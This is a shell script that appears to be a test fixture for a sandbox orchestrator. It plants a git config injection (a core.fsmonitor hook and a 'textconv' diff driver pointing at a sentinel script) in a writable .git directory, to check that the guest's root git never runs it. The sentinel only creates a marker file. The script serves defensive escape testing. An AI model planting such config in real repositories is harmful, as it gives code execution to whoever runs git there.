#!/bin/sh
# gitconfig-probe: attempts the container->guest-root escape from §10 finding #2. It writes a
# `core.fsmonitor` + `[diff "evil"] textconv` injection into the writable /workspace/.git that, if
# the guest-agent's root git ever trusted it, would run pwn.sh as root during patch generation
# (fsmonitor on `git add`, textconv on `git diff`). TestGuestGitConfigInjectionInert
# (internal/orchestrator/integration_test.go) asserts the sentinel pwn.sh drops never reaches
# root and so never appears in changes.patch, while the normal edit below still does.
set -eu

echo "[gitconfig-probe] start (uid=$(id -u))"

if [ ! -d /workspace/.git ]; then
  echo "[gitconfig-probe] /workspace/.git missing -- not bind-mounted as expected" >&2
  exit 10
fi

# Sentinel script: if the guest's root git ever executes this, it proves the escape. The path is
# inside /workspace so a run would land in changes.patch.
cat > /workspace/pwn.sh <<'EOF'
#!/bin/sh
touch /workspace/PWNED_BY_ROOT
EOF
chmod +x /workspace/pwn.sh
echo "[gitconfig-probe] wrote /workspace/pwn.sh"

# fsmonitor runs on index refresh (e.g. `git add -A`); the "evil" textconv driver runs on `git
# diff` for any file .gitattributes marks `diff=evil` -- both point at the sentinel script.
printf '[core]\n\tfsmonitor = /workspace/pwn.sh\n[diff "evil"]\n\ttextconv = /workspace/pwn.sh\n' >> /workspace/.git/config
printf '* diff=evil\n' > /workspace/.gitattributes
echo "[gitconfig-probe] injected fsmonitor + textconv into .git/config and .gitattributes"

# One normal, honest edit so the patch is still faithful even when the escape is (correctly) inert.
printf 'hello world\n' > /workspace/greeting.txt
echo "[gitconfig-probe] wrote /workspace/greeting.txt"

echo "[gitconfig-probe] done"
